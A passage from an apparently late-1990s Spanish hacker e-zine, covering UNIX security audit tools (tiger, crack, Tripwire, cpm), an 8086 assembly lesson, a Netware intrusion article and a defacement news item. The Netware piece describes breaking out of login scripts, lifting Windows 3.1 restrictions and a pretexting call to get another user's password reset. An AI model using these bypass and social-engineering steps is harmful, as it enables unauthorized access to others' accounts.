                sysdiag:*:0:1:Old System Diagnostic:/usr/diag/sysdiag:/usr/diag/sysdiag/sysdiag
        Warning!  Password file, line 13, user sundiag has uid = 0 and is not root
                sundiag:*:0:1:System Diagnostic:/usr/diag/sundiag:/usr/diag/sundiag/sundiag
        Warning!  YPassword file, line 2, user sundiag has uid = 0 and is not root
                sundiag:*:0:1:System Diagnostic:/usr/diag/sundiag:/usr/diag/sundiag/sundiag
        Warning!  YPassword file, line 3, user sysdiag has uid = 0 and is not root
                sysdiag:*:0:1:Old System Diagnostic:/usr/diag/sysdiag:/usr/diag/sysdiag/sysdiag
        Warning!  /etc/ftpusers should exist!
        Warning! Anon-ftp directory pub is World Writable!

2.2.- tiger

Es un software desarrollado por la Universidad de Texas que está formado por un 
conjunto de shell scripts y código C que chequean el sistema para detectar problemas
de seguridad de forma parecida a COPS. Una vez chequeado el sistema, se genera un
fichero con toda la información recogida por el programa. Tiger dispone de una 
herramienta (tigexp) que recibe como parámetro dicho fichero y da una serie de 
explicaciones adicionales de cada línea que generó el programa anterior. El
programa viene con un fichero de configuración donde es posible decirle qué tipo
de chequeo se quiere realizar (podemos comentar las operaciones más lentas y ejecutar
éstas de forma menos continuada, mientras que las más rápidas pueden ser ejecutadas 
más frecuentemente). Entre la información que chequea el programa tenemos.

     Configuración del sistema.
     Sistemas de ficheros.
     Ficheros de configuración de usuario.
     Chequeo de caminos de búsqueda.
     Chequeos de cuentas.
     Chequeos de alias.
     Comprueba la configuración de ftp "anonymous".
     Chequeo scripts de cron.
     NFS.
     Chequeo de servicios en el fichero /etc/inetd.conf
     Chequeo de algunos ficheros de usuario (.netrc, .rhosts, .profile, etc)
     Comprobación ficheros binarios (firmas). Para poder chequear éstos es 
     necesario disponer de un fichero de firmas.

2.3.- crack

Este paquete de dominio público realizado por Alex Muffet permite chequear el fichero 
de contraseñas de UNIX y encontrar palabras de paso triviales o poco seguras. Para ello 
utiliza el algoritmo de cifrado (DES) utilizado por el sistema UNIX y va comprobando a 
partir de reglas y de diccionarios, las palabras de paso que se encuentran en el fichero 
de contraseñas, creando un fichero con todos los usuarios y palabras descubiertas. Se 
realizan una serie de pasadas sobre el fichero de contraseñas aplicando la secuencia 
de reglas que se especifique. Estas reglas se encuentran en dos ficheros (gecos.rules y
dicts.rules) y pueden ser modificadas utilizando un lenguaje bastante simple. Para una 
mayor efectividad pueden utilizarse diccionarios complementarios (existen en gran 
diversidad en servidores ftp) en diferentes idiomas y sobre diversos temas. Experiencias 
realizadas en la Universidad Carlos III de Madrid sobre diversas máquinas han arrojado 
unos resultados de 16% de palabras de paso triviales en máquinas donde no se tenía ninguna 
norma a la hora de poner contraseñas de usuario.

Es una buena norma pasar de forma periódica el crack para detectar contraseñas poco seguras,
además de tener una serie de normas sobre palabras de paso (tanto en su contenido como en la 
periodicidad con que deben ser cambiadas).

2.4.- Tripwire

Este software de dominio público desarrollado por el Departamento de Informática de la 
Universidad de Purdue, es una herramienta que comprueba la integridad de los sistemas 
de ficheros, y ayuda al administrador a monitorizar éstos frente a modificaciones no 
autorizadas. Esta herramienta avisa al administrador de cualquier cambio o alteración 
de ficheros en la máquina (incluido binarios). El programa crea una base de datos con 
un identificador por cada fichero analizado, y puede ser comparado en cualquier momento 
el actual con el registrado en la base de datos, avisando ante cualquier alteración,
eliminación o inclusión de un nuevo fichero en el sistema de ficheros. La base datos 
está compuesta por una serie de datos como la fecha de la última modificación, propietario, 
permisos, etc. con todo ello se crea una firma para cada fichero en la base de datos. 

Esta herramienta debería ser ejecutada después de la instalación de la máquina, para 
tener una "foto" de los sistemas de ficheros en ese momento, y puede ser actualizada 
cada vez que añadimos algo nuevo. Dispone de un fichero de configuración que permite 
decidir qué parte del sistema de ficheros va a ser introducida en la base de datos para 
su posterior comprobación.

2.5.- chkwtmp

Es un pequeño programa que chequea el fichero "/var/adm/wtmp" y detecta entradas que 
no tengan información (contienen sólo bytes nulos). Estas entradas son generadas por 
programas tipo "zap" que sobreescriben la entrada con ceros, para así ocultar la presencia
de un usuario en la máquina. Este programa detecta esa inconsistencia y da un aviso de 
modificación del fichero y entre qué espacio de tiempo se produjo. 

2.6.- chklastlog

Parecido al programa anterior. Éste chequea los ficheros "/var/adm/wtmp" y "/var/adm/lastlog". 
El primero es la base de datos de login, y el segundo la información del último login de un 
usuario. En el segundo fichero nos indica qué usuario ha sido eliminado del fichero. 

2.7.- spar

Software de dominio público diseñado por CSTC (Computer Security Technology Center) 
realiza una auditoría de los procesos del sistema, mucho más flexible y potente que 
el comando lastcomm de UNIX. El programa lee la información recogida por el sistema 
y puede ser consultada con una gran variedad de filtros como. usuario, grupo, dispositivo, 
admitiendo también operadores (=, , <, =, &&...). Por defecto el programa obtiene la 
información del fichero "/var/adm/pacct". Pero se le puede indicar otro fichero. 
La información puede ser mostrada en ASCII o en binario para su posterior proceso con spar.

2.8.- lsof (List Open Files)

Este programa de dominio público creado por Vic Abell, nos muestra todos los 
ficheros abiertos por el sistema, entendiendo por fichero abierto: un fichero 
regular, un directorio, un fichero de bloque , fichero de carácter, un fichero 
de red (socket, fichero NFS). El programa admite varios parámetros que nos permiten 
filtrar información dependiendo qué tipo de procesos queramos ver en ese instante.
Este software está disponible para una gran variedad de plataformas: Aix 3.2.3, HP-UX 7.x y
8.x, IRIX 5.1.1, SunOs 4.1.x, Ultrix 2.2 y 4.2, Solaris 2.3, NetBSD ...


Veamos a continuación un pequeño extracto de una salida de este programa:


   COMMAND    PID   USER FD   TYPE   DEVICE   SIZE/OFF  INODE NAME

                  0     root  cwd   VDIR     7,   0       1536      2 / (/dev/sd0a)
    init          1     root  cwd   VDIR     7,   0       1536      2 / (/dev/sd0a)
    init          1     root  txt   VREG     7,   0      65536   1252 / (/dev/sd0a)
                  2     root  cwd   VDIR     7,   0       1536      2 / (/dev/sd0a)
    portmap      57     root  cwd   VDIR     7,   0       1536      2 / (/dev/sd0a)
    portmap      57     root  txt   VREG     7,   6      24576   6115 /usr (/dev/sd0g)
    ypserv       62     root  12u   unix 0xff64ee0c        0x0        -(none)
    ypbind       66     root  8uW   VREG     7,   0         14   1279 / (/dev/sd0a)
    rpc.ypupd    68     root  cwd   VDIR     7,   0        512   3670 /var/yp

    rpc.ypupd    68     root  txt   VREG     7,   6      16384   6204 /usr (/dev/sd0g)
    rpc.ypupd    68     root  txt   VREG     7,   6      24576   7334 /usr (/dev/sd0g)
    named        83     root  cwd   VDIR     7,   0        512   2484 /etc/namedb
    named        83     root  txt   VREG     7,   0     106496    130 / (/dev/sd0a)
    named        83     root   7u   inet 0xff64988c        0x0    UDP *:domain
    named        83     root   8r   VREG     7,   0       2268     30 / (/dev/sd0a)
    named        83     roo    9u   inet 0xff64958c        0x0    UDP *:681
    syslogd      99     root  22w   VREG     7,  14     102657  73779 /usr/local (/dev/sd1g)
    syslogd      99     root  23w   VREG     7,  14     102657  73779 /usr/local (/dev/sd1g)
    syslogd      99     root  24w   VREG     7,  14     280321 276653 /usr/local (/dev/sd1g)
    sendmail    107     root  cwd   VDIR     7,   0        512   2468 /var/spool/mqueue
    sendmail    107     root  txt   VREG     7,   6     172032   7302 /usr (/dev/sd0g)

2.9.- cpm (Check Promiscuous Mode)

Este pequeño programa realizado por la Universidad de Carnegie Mellon, chequea el 
interfaz de red de la máquina descubriendo si está siendo utilizado en modo 
promiscuo (escuchando todo el tráfico de la red). Está herramienta es muy útil,
porque nos alerta de la posible existencia de un "sniffer" (olfateador) que intente
capturar información en nuestra red como puedan ser las palabras de paso. Este programa
debería ser ejecutado de forma periódica para detectar lo antes posible el estado 
promiscuo en la placa de red. Una forma útil de utilizarlo es mandarnos el resultado 
vía correo electrónico.

Es bueno tener en cuenta que muchos de los programas descritos en este documento 
pueden poner la placa en modo promiscuo con lo que deberemos asegurarnos que no 
son nuestros programas los que producen esa alerta. Generalmente los programas tipo 
"sniffer" suelen estar ejecutándose como procesos camuflados en el sistema.

2.10.- ifstatus

Software de dominio público creado por Dave Curry, permite (al igual que el anterior) 
descubrir si un interfaz de red está siendo utilizado en modo promiscuo para capturar 
información en la red. Sirven todas las recomendaciones dichas anteriormente.

Veamos un ejemplo del mensaje que genera esta aplicación, cuando encuentra un interfaz
de red ejecutado en modo promiscuo.


                checking interface le0... flags = 0x163

                WARNING: ACME INTERFACE le0 IS IN PROMISCUOUS MODE.

                checking interface lo0... flags = 0x49


2.11.- osh (Operator Shell)

Creado por Mike Neuman, este software de dominio público es una shell restringida con 
"setuid root", que permite indicar al administrador mediante un fichero de datos qué 
comandos puede ejecutar cada usuario. El fichero de permisos está formado por nombres 
de usuario y una lista de los comandos que se permite a cada uno de ellos, también es 
posible especificar comandos comunes a todos ellos. Esta shell deja una auditoría de 
todos los comandos ejecutados por el usuario (indicando si pudo o no ejecutarlos), además 
dispone de un editor (vi) restringido. Este programa es de gran utilidad para aquellas 
máquinas que dispongan de una gran cantidad de usuarios y no necesiten ejecutar muchos 
comandos, o para dar privilegios a determinados usuarios "especiales" que tengan que 
ejecutar algún comando que en circunstancias normales no podrían con una shell normal.

Veamos un ejemplo de traza creada por el programa:


        LOGIN: acme ran osh at Wed Jun  7 12:09:09 1995

        acme (6/7/95 12:09:11)pwd               -

        acme (6/7/95 12:09:13)ls                +

        acme (6/7/95 12:09:16)ls -la            +

        acme (6/7/95 12:09:20)elm               -

        acme (6/7/95 12:09:23)quit              -

        acme (6/7/95 12:09:25)exit              -

        acme (6/7/95 12:09:27)logout            -

        acme (6/7/95 12:09:31)exit              -

        logout: acme left osh at Wed Jun  7 12:09:32 1995


2.12.- noshell

Este programa permite al administrador obtener información adicional sobre intentos
de conexión a cuentas canceladas en una máquina. Para utilizarlo basta sustituir la 
shell de usuario en el fichero /etc/password por este programa. A partir de ahora cada
intento de conexión generará un mensaje (vía correo electrónico o syslog) indicando: 
usuario remoto, nombre del ordenador remoto, dirección IP, día y hora del intento de 
login y tty utilizado para la conexión.

Conclusión

Después de esta pequeña descripción (más bien enumeración) de este conjunto de 
herramientas y como final a este pequeño artículo, me gustaría comentar que hay 
aspectos de la seguridad muy importantes que por falta de espacio, no están recogidos
en este documento. De todos ellos quizás los más importantes que no han sido tratados
aquí, sean las herramientas de cifrado.
Existen una gran cantidad de herramientas de dominio público que nos permiten cifrar
la información como por ejemplo el correo electrónico (además de firmar el mensaje). 
El establecimiento de terminal remoto cifrados (esto es muy útil para defenderse de "sniffers"). 

También el tema de las palabras de paso es bastante importante, para esto disponemos a 
su vez de herramientas como pueden ser las "one time password" y algunas modificaciones 
del comando de "password" que permiten utilidades adicionales. Por último (pero no menos 
importante) los "firewalls" (cortafuegos) son de una gran ayuda para crear en nuestra 
organización redes seguras separadas de la red que directamente nos conecta a Internet, 
mediante una serie de filtros de los servicios TCP/IP.


Francisco Cruz Argudo
Técnico de redes 
Centro de Cálculo 
Universidad Carlos III de Madrid
(paco@di.uc3m.es)
http://porky.uc3m.es/~paco/paco.html 

Todas las herramientas mencionadas se pueden conseguir por FTP anónimo en el servidor lince.uc3m.es.

                               Apéndice - Lecturas recomendadas

- Bellovin, S, "There Be Dragons", Third Usenix UNIX Security Symposium, Baltimore, 
September 1992.

- Bellovin, S, "Security Problems in the TCP/IP Protocol Suite", Computer 
Communications Review 19 (2), 1989. 

- CERT Advisories. CERT, Carnegie Mellon University 

- Cheswick, B, "An Evening with Berfred In wich a Cracker is Lured, Endured, 
and Studied", Winter USENIX Conference (San Francisco), January 1992.

- Cheswick, W, R, Bellovin, S, M, "Firewalls ans Internet Security", 
Addison-Wesley Profesional Computing Series,1994.

- Curry, D, "Improving the Security of your UNIX System", SRI International.

- Farmer, D, & Venema, W, "Improving the security of your site by breaking 
into it". USENET newsgroup comp.security.unix.

- Frederick, M, & Ranum, M, "A Network Perimeter With Secure External Access", 
Internet Society Symposium on Network and Distributed Systems Security, February 1994.

- Garfinkel, S, & Spafford, G, and Pooch, U, "Practical Unix Security" O
'Reilly and Associates, Inc., 1992.

- Morrison, G, "UNIX Security Tools". Division of Information Technology. 
CSRIO Review of Computer Network Security. 

- Pethia, R, D & van Wyk, K, R, "Computer Emergency Response-An International 
Problem", CERT, Carnegie Mellon Universitty

- Quinn, S, "Network Security Tools". NIST (National Institute of 2 Standars and Technology). 

- Ranum, M, "Thinking About firewalls", Second Conference on systems and 
Network Security and Management, april, 1993.

- Venema, W, "TCP WRAPPER, Network monitoring, access control, and booby traps",
 UNIX Security Symposium III Procedings Baltimore), September 1992.



ÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇ



                  ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
			#					  #
			#  8.- Curso Basico de ASM      #
			#	   Parte I (guan)         #
			#					  #
                  ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


______________________________________________________________________ By AnDyK


Ke tal.... de nuevo por estos lados, ahora con una serie de artículos
en los ke intentaré ampliar sus conocimientos sobre uno de los lenguajes
ke más me gusta.........Bueno vamos al grano.............

En esta primera parte hablaremos un poco de como es en forma interna el
procesador 8086 e intentar explicarlo de la mejor forma posible.......
si alguien no entiende algo, ke me escriba a andykhack@hotmail.com
y le resolver sus dudas....................

El lenguaje Assembler trabaja directamente con el procesador, por lo cual
sus instrucciones varían de acuerdo a ke procesador uses....(8085,8086,80186,
80286,80386, etc)

La serie de artículos ke escribiré estará orientado al Procesador 8086,
siendo válida esta información para todo el resto de la familia PC del 8086
en adelante.

	El Procesador 8086.-

El procesador o CPU es la parte encargada de manejar todo el computador.
Realiza cálculos, comparaciones, transferencias de datos, etc. La cpu
controla las operaciones básicas del computador enviando y recibiendo
señales de control, direcciones de memoria y datos de un lugar a otro a
través de vias electrónicas llamada BUS. A lo largo de este bus se ubican
las puertas de entrada y salida E/S ( en inglés I/O) ke comunican al
procesador y a la memoria con los dispositivos externos del computador.
El procesador 8086 tiene una barra de datos de 16 bits, (ancho del bus de
datos = 16) lo que implica ke en cada operación ke realice podrá manipular
datos de hasta 16 bits, o sea en una transferencia del procesador a la
memoria lo haría de 16 en 16 bits.

El procesadro cuenta con una serie de registro usados para realizar las
operaciones de cálculo y  almacenamiento temporal de datos. Estos registros
son como pequeñas regiones de memoria que están dentro del procesador. El
procesador accede en forma instantánea a los registros, evitando así obtener
un dato de la memoria a través del bus de datos.

	Los registros del procesador se dividen en 5 Grupos:

1.- Registros de datos: AX, BX, CX, DX
	Estos registros tienen muchos usos. Pueden ser usados ara realizar
        cálculos, realizar transferencias de datos desde una posición de
        memoria a otra, ya ke uno no puede transferir un dato desde la
        posición de memoria X a la posición Y en forma directa, lo debe
        hacer a través de un registro.

	Estos registros son de 16 bits y están formados de la siguiente forma:


        AX = AH + AL    ; Conjunci¢n entre los registros de 8 bits AH y AL
                          ambos de 8 bits cada uno. AH es la parte m s
                          significativa (los 8 bits de la izquierda) y AL la
                          menos significativa (los 8 bits de la izquierda).
                          

                         XXXXXXXX XXXXXXXX
                        15      8 7      0
                         |  AH  | |  AL  |       

        BX = BH + BL  |
        CX = CH + CL  |  Para estos registros se aplica lo mismo que para AX
        DX = DH + DL  |

        Cada uno de estos registros tienen funciones y nombres especiales ke
        es importante conocer. Al registro AX se le llama acumulador. BX se
        suele utilizar en muchas instrucciones como registro base, sobre todo
        en transferencia de datos entre memoria y procesador. CX es el
        registro contador, es utilizado para realizar bucles, etc. DX es el
        registro de datos, y se suele utilizar en operaciones de 32 bits
        almacenando en el los 16 bits m s significativos.

2.Ä Registros Indice: SI, DI, BP y SP.

      Se utilizan para acceder a memoria cuando se establece el modo de
      direccionamiento mediante indexaci¢n o con punteros.
      SI y DI indican el ¡ndice fuente y destino respectivamente.
      BP y SP indican el puntero base y el puntero de la pila respectivamenete.

      Estos 4 registros son de 16 bits, y no pueden ser utilizados como
      registros dobles de 8 bits.

    3.Ä Registros de Segmento: CS, DS, SS y ES.
      Estos registros apuntan al principio de un bloque de 64 ks de memoria o
      segmento, de ah¡ lo de la 'S' con la que finalizan todos los registros:
      CS: registro segmento de c¢digo. Establece al  rea donde se halla el
          programa en ejecuci¢n.
      DS: registro segmento de datos. Especifica la zona donde el programa
          lee y escribe los datos por defecto.
      SS: registro segmento de pila. Especifica el  rea donde se encuentra la
          pila del sistema.
      ES: registro segmento extra. Se utiliza como una extensi¢n del segmento
          de datos. Es decir, indica otro  rea de datos aparte del especificado
          por DS.

    4.Ä Puntero de instrucci¢n: IP.
      Su longitud es de 16 bits como el resto de registros.
      Indica la direcci¢n de la siguiente instrucci¢n a ejecutar, y su valor es
      ajustado durante la ejecuci¢n de la instrucci¢n en curso.
      Esta direcci¢n est  en el  rea de 64 ks de direcciones especificado
      por CS.

      CS e IP en conjunci¢n conforman la direcci¢n f¡sica real de la siguiente
      instrucci¢n a ejecutar.

    5.Ä Registro FLAGS. O banderas de estado.

      Su longitud es de 16 bits. Cada uno de estos bits contiene cierta
      informaci¢n booleano (verdadero o falso). Seg£n el valor de cada uno de
      estos bits sea 1(verdadero) ¢ 0(falso), informar  del estado de alguna
      situaci¢n en particular.

      Dentro del registro de FLAGS hay 7 bits que no se utilizan. Los nombres
      de los utilizados son: Of, Df, If, Tf, Sf, Zf, Af, Pf y Cf.

      Estos bits se clasifican en dos grupos:
      Ä Flags de estado (Cf, Af, Of, Zf, Pf y Sf): muestran el estado del
      procesador.
      Ä Flags de control ( Df, If, Tf): determinan como el procesador responder 
      a determinadas situaciones. El programador manipular  estos bits para
      controlar el modo de ejecuci¢n de algunas instrucciones.

      A continuaci¢n se muestra el significado de cada uno de los flags:

      Cf: Bit de Carry (acarreo), se activa (se pone a 1) si se produce acarreo
          en una operaci¢n aritmtica.
      Pf: Bit de paridad, se activa si el resultado de una operaci¢n tiene
          paridad par, es decir, si el resultado tiene un n§ par de unos.
      Af: Bit de carry auxiliar, se activa si una operaci¢n aritmtica produce
          acarreo de peso 16.
      Zf: Bit de cero, se activa si una operaci¢n produce 0 como resultado.
          Suele ser el m s utilizado(m s consultado) por los programadores,
          por lo menos por m¡ (AESOFT). Se utiliza para comparaciones de datos
          y para otras muchas cosas como ciertos bucles,etc.
      Sf: Bit de signo, se activa si el bit m s significativo de un resultado
          es 1. Por convenci¢n cuando se opera con n£meros negativos, se
          utiliza el bit de mayor peso para indicar el signo: si el bit es cero,
          entonces se trata de un n£mero positivo, si es 1, se trata de n£mero
          negativo. Ya veremos todo esto m s adelante.
      Tf: Bit trap o desv¡o. Si Tf=1, el procesador ejecuta las instrucciones
          una a una bajo control del usuario. Se pone a 1 este bit para realizar
          depuraciones del c¢digo que se est  ejecutando. De esta forma se puede
          seguir el flujo del programa.
      If: Bit de interrupci¢n, si vale 1, las interrupciones est n permitidas,
          y si vale 0, no.
      Df: Se usa en las instrucciones que manipulan cadenas de bytes.
          Seg£n coloque el programador este bit, a '0' o a '1', las cadenas
          de bytes ser n tratadas en sentido de direcciones crecientes o
          decrecientes.
      Of: Bit de overflow, indica desbordamiento en una operaci¢n aritmtica.



        Bus de datos.-
        Como ya mencionamos anteriormente la barra de datos del 8086 es de 16
        bits, a travs del bus de datos es por donde se hace la transferecia
        de datos desde el procesador hacia la memoria o hacia los dispositivos
        de E/S
        Bus de Direcciones.-
        El bus de direcciones apunta a una direcci¢n de memoria, a la cual
        llegar  el dato. Esta barra es de 20 bits con lo cual se deduce ke el
        procesador no puede direccionar m s all  de 2^20 osea 1048576
        direcciones



        Esto es todo por ahora...... en realidad todo esto es un lata pero 
        necesario, ya desde el pr¢ximo art¡culo comenzaremos a ver algunas
        instrucciones para comenzar a programar.

        Agradezco al gran art¡culo publicado por AESOFT y a la profe ORI de
        Microprocesadores , por los conocimientos ke me han brindado.

        CHaop y hasta la pr¢xima...........aaaa No olviden de escribir ante
        cualkier duda.

                                                _AnDyK_
                                                andykhack@hotmail.com


ÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇ




                        ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
				#							 #
                        # 9.- Jugando con Novell Netware 3.11      #
                        #  Volumen 0,5 (jeje .. Broma para TAkER)  #
				#							 #
                         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


_____________________________________________________________________________ By TAkER


Heyyy parece que estoy de vuelta, no he muerto todavia, aqui sigo y vamos a empezar con unas 
pequeñas lecciones de como jugar con Netware como te de la gana...y no asumo responsabilidad 
alguna por lo que puedas hacer con lo que encuentres en este texto, ya que es de caracter 
meramente educativo, solo para que aprendas algo mas y no para que entres ilegalmente a 
donde no te han llamado...pero la verdad es muy bacano cuando pones esto en practica y 
logras alcanzar tus objetivos...X-D (basta ya de carreta..!!)

En primer lugar debo decir que Netware es un sistema operativo (bueno, mas o menos) que 
permite el uso compartido de archivos mediante un servidor dedicado en el cual se almacenan 
los archivos del sistema Netware, de los usuarios y uno que otro programa que le de la gana 
al administrador de la red. (eso fue una breve explicacion de lo que es netware, o por lo 
menos de lo que yo creo que es Netware, si alguien esta en desacuerdo que lo diga...!!!)

Lo primero que encontraras al sentarte frente a un pc que este conectado a una red Netware 
sera un mensaje donde te pide el Login Name y luego el passwd luego de esto ejecutara una 
serie de comandos definidos previamente por el administrador de la red (puede ser entrar 
a Windows, entrar a determinado programa al que tengas acceso etc...) y si es un buen 
administrador no tendras acceso a los comandos del DOS, ya que pueden ser muy utiles..!!! 
X-D, pero como nosotros no somos mancos y tenemos nuestros dedos completos (yo si, si 
alguien no lo siento) nos podemos saltar ese paso y empezar a jugar con los comandos a 
nuestro antojo, que como, espera, no desesperes, ya te digo...mejor, les pondre un ejemplo:

Enter your login name: Hacker
Enter your password:           aqui no aparecera nada cuando lo digites.

al presionar <Enter> despues del passwd te apareceran varias cosas diferentes segun la 
configuracion que le haya dado el administrador, pero ahi es donde empiezan a trabajar tus 
dedos despues de darle <Enter> presiona rapido <Control><C> o <Control><Pausa> y listo 
quedaras utomaticamente en el prompt del DOS en la unidad que tengas asignada como 
predeterminada y ya que tienes acceso a algunos comandos desde el DOS pues mas adelante 
encontraras unos muy interesantes.

Si esto no te funciona y el script de inicio te lleva al windows 3.1 trata por la opcion de 
ejecutar, si tienes deshabilitada la opcion, no te preocupes, aqui te digo como sacarla:

Entra al administrador de archivos, busca el archivo Progman.ini renombralo a progman.txt o 
lo que se te ocurra, y abrelo con un editor de texto (lo de la renombrada no es necesario el 
caso es que lo puedas eaditar y lo guardes con formato ascii nuevamente), ya cuando tengas 
el archivo en tus ojos busca el label [restrictions], que es donde se encuentran las 
restricciones de tu windows 3.1 (si alguien quiere una descripcion mas detallada de esas 
restricciones que me mailee y se las mando todas en verdad son interesantes para 
administradores) y cambia todos los valores a 0, ya con esto tendras todas las opciones 
normales disponibles. ahh pero antes tienes que reiniciar windows para que tome los nuevos 
valores.

Otra forma de acceder a comandos del DOS es creando archivos .bat y ejecutandolos desde el 
administrador de archivos...mmm, me demore, es que se me acabo de ocurrir una idea y funciono 
sigue dando palo el administrador de archivos X-D..aunque tengas activadas las restricciones 
tienes activada la opcion de ejecutar en el administrador (lo estoy empezando a amar..!!), 
bueno creo que es suficiente explicacion de acceso a los comandos del dos ahora vamos a ver 
que comandos pueden ser utiles para nuestro beneficio...!!!

Comandos
-----------------
********
userlist
********
Este comando muestra todos los usuarios que hay actualmente conectados al servidor donde tu 
estas, saca un listado como es siguiente:

                User Information for Server HaCked
                Connection  User Name       Login Time
                ----------  --------------  -------------------
                     1    * SUPERVISOR       8-16-1998  5:37 pm
                     2      SUPERVISOR       8-16-1998  4:55 pm
                     3      CORREO           8-16-1998  5:21 pm

==> Explicacion     (1)    (     2        )  (        3       )

(1) Numero de Conexion en el servidor
(2) Nombre de Usuario aqui vemos que el Supervisor esta conectado dos veces el "*" nos 
    indica que es la conexion donde se ejecuto el comando userlist (Parece que soy el 
    supervisor X-D !!!) y el usuario correo tambien esa la puse para ensayar lo del 
    administrador de archivos..!!
(3) Fecha y hora de la conexion del usuario.

Nota: este listado esta tan corto porque hoy es domingo y los muy cabrones me pusieron a 
      trabajar todo el fin de semana >:(, pero en otros dias se ven hasta 50 usuarios 
      conectados..
Bueno, ya pueden ir viendo la necesidad de tener acceso a comandos del DOS, ya tienes 
cuentas por donde empezar, como la del correo por ejemplo, y puedes ensayar la ingenieria 
social con el supervisor haciendo algo asi como:
pero primero asegurate de que el usuArio victima no este conectado

Super: Sistemas buenos dias en que puedo servirle..??
hacker: si buenos dias, lo que pasa es que se me olvido mi passwd
Super: mmm, tiene que enviarme una orden por escrito y firmada por su jefe para asignarle 
       otro
hacker: bueno gracias..cuelga
hacker: ese /%$%$&//
--------- Parece que no funciono esta vez ---------------

Super: Sistemas buenos dias, en que puedo servirle
hacker: Si buenos dias, lo que pasa es que mi compañero se enfermo y necesito accesar una 
        archivo de su cuenta..
Super: Si y cual es la cuenta..???
Hacker: La cuenta es Correo
Super: aja, lo unico que puedo hacer es cambiarle el passwd
Hacker: y no me puede decir el actual..???
Super: No, eso no lo puedo hacer, no tengo acceso a esa informacion...
Hacker: Bueno, entonces la puede cambiar por favor..??
Super: ok, intente en 5 minutos con el passwd 123456
Hacker: Ok, gracias...

-- No es muy bueno que cuando el dueño de la firma del correo no la pueda accesar---
----- y luego vaya a informarle al Supervisor, pero eso ya es otro rollo------------
------------------------- Tu ya lograste tu objetivo -------------------------------
 
Bueno hasta aki la primera edicion .

Heyyy, aqui estoy para disculparme con los lectores de la revista, tal vez me
tilden de perezoso, o de dejado, pero la verdad no es asi.
Y ustedes diran, aque viene todo este rollo, pues les contare, habia hablado
con PlaXiuS, nuestro querido editor, acerca de un articulo de Netware y las
que posibilidades que ofrece, pues bueno, resulta que ademas de mis
obligaciones normales (estudio, trabajo, etc), estuve en un viaje maravilloso
por el mundillo del AS/400 (ohh, que maquina...!!!, y como alguna vez alguien
me dijo por ahi, "Desearia tener una de esas en mi cuarto" ;-) ), fue un
viaje de varios dias, donde conoci muchas de sus posibilidades (no digo
todas, pues me falta explorarlo por mis propios medios XD). Fue por causa de
ese viaje, que el articulo de Netware quedo a medias, mejor dicho, a medias
de la mitad, (uds entienden, lo empece pero no lo he terminado), y como
quiero que sea algo muy especial, pues le debo dedicar mas tiempo, y parece
que con las renovaciones tecnologicas que esta sufriendo a empresa donde
trabajo, mis cargas se van a disminuir en un 75% (espero que esto no lo lean
mis jefes..XD) por lo que voy a tener todo el tiempo del mundo para sacarlo
en la proxima edicion de Proyecto_R la cuarta edicion de su e-zine...!!!
Notese que digo su e-zine, ya que es alli donde podran (podremos) aprender
muchas cosas que nunca nadie nos explicaria, un e-zine que es el resultado
del trabajo de mucha gente, gente que solo se conoce por sus Nicks via mail
o irc, gente que nunca se hubiera encontrado si no estuviera en este mundo
en el que vivimos, gente normal como tu, pero con un amor sin igual a las
maquinas en las cuales se sientan la mayor parte de su tiempo a sacarle
provecho al maximo (upsssss creo que me fui por otro lado...mejor sigo con
lo que iba.)

El caso es que si tienen acceso a cualquier cuenta de Netware pueden bajar
algunos programillas en mi page (www.geocities.com/siliconvalley/hills/8747)
y pueden ir ensayando, o si desean pueden esperar a que salga el articulo
con una descripcion detallada de cada programa y lo que hace.
Si tienen alguna duda, por favor comuniquenla a mi mail (respondo a casi
todos pues uds son mis unicos amigos), sin mas que decir por ahora se
despide su amigo TAkER...

Pd: Segun el instructor del curso, el secreto de los passwd del AS/400 se lo
tienen tan bien guardado los de IBM, que ni el sabe donde se encuentran, si
alguien sabe algo por favor me mailea a ver si asi sacamos del dilema en que
se encuentra mi instructor desde hace 15 a¤os que trabaja con IBM. XDDDDD
yo por lo pronto ya estoy trabajando en lo mio.

Bueno, creo que me extendi demasiado, y gracias a PlaXiuS y a todos ustedes
por entender... ;-)

Suerte n' be phree...
TAkER

ÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇ


				~~~~~~~~~~~~~~~~~~~~~~
  				#			   #
    		      	# 10.-BacKDoorS      #
                	      #      (NEWS)        #
				#			   #
				~~~~~~~~~~~~~~~~~~~~~~


__________________________________________________________ By Mate Swichman

Bueno aki nuestro amigo Mate nos deleitara con esta seccion ya que sera amo
y señor de BacKDoorS .. asi que vamos Mate tu puedes !!!!



UN ATAQUE DE HACKERS OBLIGO A CERRAR EL SITE DEL NEW YORK TIMES
En lo que se considera el primer ataque con éxito al site de un poderoso
medio de comunicación, un grupo de hackers reemplazó la portada de la web
del New York Times con imágenes de mujeres desnudas y mensajes agresivos a
diferentes miembros del diario. El sabotaje, descubierto a primera hora del
domingo, obligó a los editores de la página del tradicional medio de
comunicación a cerrar el site hasta la noche para poder solucionar el
problema. El ataque se lo adjudicó un grupo que se hace llamar "Hacking for
Girlies", el cual también publicó mensajes que repudiaban la cobertura que
el New York Times había hecho sobre el arresto de Kevin Mitnick en el año
1995. En aquel entonces, Mitnick era considerado por el FBI el hacker más
buscado del mundo y, en estos momentos, se espera el comienzo del juicio
que comenzará en enero próximo en el que se lo acusará de diferentes cargos
fraudes y realizados a través del uso de las computadoras.
http://www.wired.com/news/news/politics/story/14990.html

